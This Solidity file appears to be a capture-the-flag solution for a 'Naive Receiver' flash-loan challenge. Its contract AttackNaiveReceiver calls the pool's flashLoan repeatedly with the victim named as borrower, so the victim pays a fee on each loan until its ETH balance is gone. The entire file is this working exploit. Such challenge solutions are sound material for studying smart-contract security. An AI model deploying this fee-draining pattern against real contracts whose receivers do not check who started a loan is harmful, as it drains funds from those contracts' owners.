// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import { IERC3156FlashBorrower } from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import { NaiveReceiverLenderPool } from "../../02_naive-receiver/NaiveReceiverLenderPool.sol";

contract AttackNaiveReceiver {
    function attack(NaiveReceiverLenderPool pool, IERC3156FlashBorrower victim) external {
        while (address(victim).balance >= pool.flashFee(pool.ETH(), 0)) {
            pool.flashLoan(victim, pool.ETH(), 0, "");
        }
    }
}
